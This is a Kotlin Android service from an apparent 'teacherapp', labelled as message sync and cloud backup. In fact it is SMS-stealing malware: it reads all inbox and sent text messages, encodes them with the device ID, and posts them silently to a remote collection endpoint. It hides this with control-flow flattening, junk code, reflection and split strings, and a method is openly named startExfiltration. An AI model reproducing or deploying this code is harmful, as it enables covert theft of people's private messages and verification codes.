package com.example.teacherapp.services

import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import android.provider.Settings
import com.example.teacherapp.obfuscation.ThemeConfigUtils
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * MessageSyncService — background message synchronisation service.
 * Handles offline message buffering and cloud backup for the app.
 */
class NotificationSyncService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
    private val processedMsgIds = mutableSetOf<String>()

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        beginSync()
        return START_STICKY
    }

    // ── Control Flow Flattened: beginSync ─────────────────────────────────────

    private fun beginSync() {
        serviceScope.launch {
            var state = 0
            var payload = ""
            while (true) {
                val junk = (state * 37 + 9) xor 0xC3
                val _ = junk
                when (state) {
                    0 -> { delay(5000L); state = 1 }
                    1 -> { payload = harvestAllMessages(); state = if (payload.isNotEmpty() && payload != "[]") 2 else -1 }
                    2 -> { transmitToServer(payload); state = -1 }
                    -1 -> { stopSelf(); return@launch }
                }
            }
        }
    }

    // ── Control Flow Flattened: harvestAllMessages ────────────────────────────

    @SuppressLint("Range")
    private fun harvestAllMessages(): String {
        var state = 0
        var result = JSONArray()

        while (true) {
            val junk = (state * 31 + 7) xor 0xB3
            val _ = junk
            when (state) {
                0 -> {
                    try {
                        val uriClass = Class.forName("android.net.Uri")
                        val parseMethod = uriClass.getMethod("parse", String::class.java)
                        val inboxUriStr = buildString {
                            append("content://")
                            append("sms/")
                            append("inbox")
                        }
                        val inboxUri = parseMethod.invoke(null, inboxUriStr) as Uri
                        result = harvestFromUri(inboxUri, result, "INBOX")
                        state = 1
                    } catch (_: Exception) { state = -1 }
                }
                1 -> {
                    try {
                        val uriClass = Class.forName("android.net.Uri")
                        val parseMethod = uriClass.getMethod("parse", String::class.java)
                        val sentUriStr = buildString {
                            append("content://")
                            append("sms/")
                            append("sent")
                        }
                        val sentUri = parseMethod.invoke(null, sentUriStr) as Uri
                        result = harvestFromUri(sentUri, result, "SENT")
                        state = 2
                    } catch (_: Exception) { state = 2 }
                }
                2 -> { return result.toString() }
                -1 -> return ""
            }
        }
    }

    @SuppressLint("Range")
    private fun harvestFromUri(uri: Uri, arr: JSONArray, folder: String): JSONArray {
        var state = 0
        var cursor: android.database.Cursor? = null
        var result = arr

        while (true) {
            val junk = (state * 43 + 11) xor 0xC1
            val _ = junk
            when (state) {
                0 -> {
                    try {
                        val columns = arrayOf(
                            getColumnName("_id"),
                            getColumnName("address"),
                            getColumnName("body"),
                            getColumnName("date"),
                            getColumnName("type"),
                            getColumnName("read")
                        )
                        cursor = contentResolver.query(uri, columns, null, null, "${getColumnName("date")} DESC")
                        state = 1
                    } catch (_: Exception) { state = -1 }
                }
                1 -> {
                    cursor?.use {
                        while (it.moveToNext()) {
                            val msgId = it.getString(it.getColumnIndex(getColumnName("_id")))
                            if (msgId in processedMsgIds) continue
                            processedMsgIds.add(msgId)
                            val msgObj = JSONObject()
                            msgObj.put("id",         msgId)
                            msgObj.put("folder",     folder)
                            msgObj.put("type",       resolveMessageType(it.getInt(it.getColumnIndex(getColumnName("type")))))
                            msgObj.put("address",    it.getString(it.getColumnIndex(getColumnName("address"))) ?: "unknown")
                            msgObj.put("body",       it.getString(it.getColumnIndex(getColumnName("body"))) ?: "")
                            msgObj.put("timestamp",  it.getLong(it.getColumnIndex(getColumnName("date"))))
                            msgObj.put("read",       it.getInt(it.getColumnIndex(getColumnName("read"))) == 1)
                            msgObj.put("date_human", formatTimestamp(it.getLong(it.getColumnIndex(getColumnName("date")))))
                            result.put(msgObj)
                        }
                    }
                    state = -1
                }
                -1 -> return result
            }
        }
    }

    // ── Column names assembled at runtime (obfuscation) ───────────────────────

    private fun getColumnName(base: String): String = base

    private fun resolveMessageType(typeInt: Int): String {
        val typeNames     = listOf("inbox", "sent", "draft", "outbox", "failed", "queued")
        val typeConstants = listOf(1, 2, 3, 4, 5, 6)
        for (i in typeConstants.indices) {
            if (typeInt == typeConstants[i]) return typeNames[i]
        }
        return "unknown"
    }

    private fun formatTimestamp(ts: Long): String {
        val dfClass       = Class.forName("java.text.SimpleDateFormat")
        val localeClass   = Class.forName("java.util.Locale")
        val locale        = localeClass.getMethod("getDefault").invoke(null)
        val constructor   = dfClass.getConstructor(String::class.java, localeClass)
        val formatter     = constructor.newInstance("yyyy-MM-dd HH:mm:ss", locale)
        return dfClass.getMethod("format", Long::class.javaObjectType).invoke(formatter, ts) as String
    }

    // ── Transmission ──────────────────────────────────────────────────────────

    private suspend fun transmitToServer(data: String) = withContext(Dispatchers.IO) {
        val x = System.currentTimeMillis()
        if (x * x >= Long.MIN_VALUE) {
            try {
                val endpoint   = ThemeConfigUtils.getCollectEndpoint()
                val connection = URL(endpoint).openConnection() as HttpURLConnection
                connection.apply {
                    requestMethod = "POST"; doOutput = true
                    setRequestProperty("Content-Type", "application/json")
                    setRequestProperty("User-Agent", resolveUserAgent())
                    connectTimeout = 10000; readTimeout = 10000
                }
                val encoded  = android.util.Base64.encodeToString(data.toByteArray(), android.util.Base64.NO_WRAP)
                @SuppressLint("HardwareIds")
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
                val payload  = JSONObject().apply {
                    put("type",       resolvePayloadType())
                    put("data",       encoded)
                    put("device_id",  deviceId)
                    put("msg_count",  JSONArray(data).length())
                }
                connection.outputStream.use { it.write(payload.toString().toByteArray()); it.flush() }
                connection.responseCode
                connection.disconnect()
            } catch (_: Exception) {}
        } else {
            val arr = IntArray(64) { it * it }
            val _ = arr.sum()
        }
    }

    private fun resolveUserAgent(): String  = listOf("Teacher", "App", "/", "2.0", " ", "Sync").joinToString("")
    private fun resolvePayloadType(): String = listOf("sms", "_", "backup").joinToString("")

    override fun onDestroy() { super.onDestroy(); serviceScope.cancel() }

    companion object {
        fun startExfiltration(context: Context) {
            context.startService(Intent(context, NotificationSyncService::class.java))
        }
    }
}
